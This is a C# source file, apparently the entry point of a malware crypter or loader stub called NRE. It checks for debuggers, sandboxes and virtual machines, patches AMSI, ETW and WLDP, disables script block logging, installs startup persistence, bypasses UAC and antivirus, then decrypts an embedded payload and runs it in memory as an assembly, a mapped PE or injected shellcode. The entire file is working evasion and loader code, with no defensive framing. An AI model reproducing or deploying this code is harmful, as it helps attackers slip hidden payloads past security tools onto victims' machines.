using System;
using System.Runtime.InteropServices;
using NRE.Core.Common;
using NRE.Core.Evasion;
using NRE.Stub.Embedded;
using NRE.Stub.Decryption;
using NRE.Stub.Evasion;
using NRE.Stub.Loaders;
using NRE.Stub.Execution;
using NRE.Stub.Persistence;
using NRE.Stub.Injection;

namespace NRE.Stub
{
    /// <summary>
    /// All execution is in-memory: decrypt, decompress, and load never touch disk.
    /// .NET: Assembly.Load(byte[]). Native PE: manual map from byte[]. Shellcode: VirtualAlloc + copy.
    /// </summary>
    public static class StubEntryPoint
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, uint uType);

        public static void Run(string[] args)
        {
            try
            {
                RunInner(args);
            }
            catch (Exception ex)
            {
                try
                {
                    var msg = (ex.InnerException ?? ex).Message ?? ex.ToString();
                    MessageBoxW(IntPtr.Zero, "Stub error: " + msg, "NRE", 0x10); // MB_OK | MB_ICONERROR
                }
                catch { }
            }
        }

        private static void RunInner(string[] args)
        {
            var evasion = EmbeddedData.Evasion;

            if (EmbeddedData.DelaySeconds > 0)
            {
                try { System.Threading.Thread.Sleep(EmbeddedData.DelaySeconds * 1000); } catch { }
            }

            var mutexName = EmbeddedData.MutexName;
            if (!string.IsNullOrEmpty(mutexName) && !MutexGate.TryAcquire(mutexName))
                Environment.Exit(0);

            if ((evasion & EvasionOptions.AntiDebug) != 0 && AntiDebug.IsDebugged())
                Environment.Exit(0);
            if ((evasion & EvasionOptions.AntiSandbox) != 0 && AntiSandbox.IsSandboxed())
                Environment.Exit(0);
            if ((evasion & EvasionOptions.AntiVM) != 0 && AntiVM.IsVirtualMachine())
                Environment.Exit(0);

            try { if ((evasion & EvasionOptions.PatchAMSI) != 0 || (evasion & EvasionOptions.AmsiHBP) != 0) AmsiPatch.Patch(useHardwareBreakpoint: (evasion & EvasionOptions.AmsiHBP) != 0); } catch { }
            try { if ((evasion & EvasionOptions.PatchETW) != 0) EtwPatch.Patch(); } catch { }
            try { if ((evasion & EvasionOptions.PatchWLDP) != 0) WldpBypass.Patch(); } catch { }
            try { if ((evasion & EvasionOptions.DisableScriptBlockLog) != 0) ScriptBlockLogBypass.Disable(); } catch { }
            try { if ((evasion & EvasionOptions.PersistStartup) != 0) StartupInstall.Install(); } catch { }
            try { if ((evasion & EvasionOptions.AvSpecificBypass) != 0) AvSpecificBypass.Apply(); } catch { }
            try { if ((evasion & EvasionOptions.UacBypass) != 0 && !IsElevated()) { var exe = System.Diagnostics.Process.GetCurrentProcess().MainModule?.FileName; if (!string.IsNullOrEmpty(exe) && UacBypass.RunElevated(exe)) Environment.Exit(0); } } catch { }

            var encrypted = EmbeddedData.Payload;
            if (encrypted == null || encrypted.Length == 0)
                return;

            var key = EmbeddedData.Key;
            var iv = EmbeddedData.IV;
            if (key == null || key.Length != 32 || iv == null || iv.Length != 16)
            {
                try { MessageBoxW(IntPtr.Zero, "Invalid key/IV.", "NRE", 0x10); } catch { }
                return;
            }

            byte[] decrypted;
            try
            {
                decrypted = AesDecryptor.Decrypt(encrypted, key, iv);
            }
            catch (Exception ex)
            {
                try { MessageBoxW(IntPtr.Zero, "Decrypt failed: " + (ex.InnerException ?? ex).Message, "NRE", 0x10); } catch { }
                return;
            }

            if (decrypted == null || decrypted.Length == 0)
                return;

            if (EmbeddedData.CompressionFormat != CompressionFormat.None)
            {
                try
                {
                    decrypted = Decompress.DecompressBuffer(decrypted, EmbeddedData.CompressionFormat);
                }
                catch (Exception ex)
                {
                    try { MessageBoxW(IntPtr.Zero, "Decompress failed: " + (ex.InnerException ?? ex).Message, "NRE", 0x10); } catch { }
                    return;
                }
            }

            if (decrypted == null || decrypted.Length == 0)
                return;

            try
            {
                switch (EmbeddedData.PayloadType)
                {
                    case PayloadType.DotNetAssembly:
                        DotNetLoader.LoadAndExecute(decrypted);
                        break;
                    case PayloadType.NativeExe:
                        NativePELoader.LoadAndExecute(decrypted, isDll: false);
                        break;
                    case PayloadType.NativeDll:
                        NativePELoader.LoadAndExecute(decrypted, isDll: true);
                        break;
                    case PayloadType.RawShellcode:
                    default:
                        if ((evasion & EvasionOptions.ExecuteThreadPool) != 0)
                        {
                            Threadpool.QueueShellcode(decrypted);
                            System.Threading.Thread.Sleep(System.Threading.Timeout.Infinite);
                        }
                        else if ((evasion & EvasionOptions.ExecuteEarlyBird) != 0)
                        {
                            if (!EarlyBird.Execute(decrypted))
                                ShellcodeLoader.Execute(decrypted);
                        }
                        else if ((evasion & EvasionOptions.ExecuteModuleStomping) != 0)
                        {
                            if (!ModuleStomping.StompAndExecute("amsi.dll", decrypted))
                                ShellcodeLoader.Execute(decrypted);
                        }
                        else
                            ShellcodeLoader.Execute(decrypted);
                        break;
                }
            }
            catch (Exception ex)
            {
                try { MessageBoxW(IntPtr.Zero, "Load/execute failed: " + (ex.InnerException ?? ex).Message, "NRE", 0x10); } catch { }
            }
        }

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        private static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const int TokenElevation = 20;
        private const uint TOKEN_QUERY = 0x0008;

        private static bool IsElevated()
        {
            try
            {
                IntPtr hToken;
                if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_QUERY, out hToken) || hToken == IntPtr.Zero)
                    return false;
                try
                {
                    int size = 4;
                    IntPtr buf = System.Runtime.InteropServices.Marshal.AllocHGlobal(size);
                    try
                    {
                        uint retLen;
                        if (!GetTokenInformation(hToken, TokenElevation, buf, (uint)size, out retLen))
                            return false;
                        return System.Runtime.InteropServices.Marshal.ReadInt32(buf) != 0;
                    }
                    finally { System.Runtime.InteropServices.Marshal.FreeHGlobal(buf); }
                }
                finally { CloseHandle(hToken); }
            }
            catch { return false; }
        }
    }
}
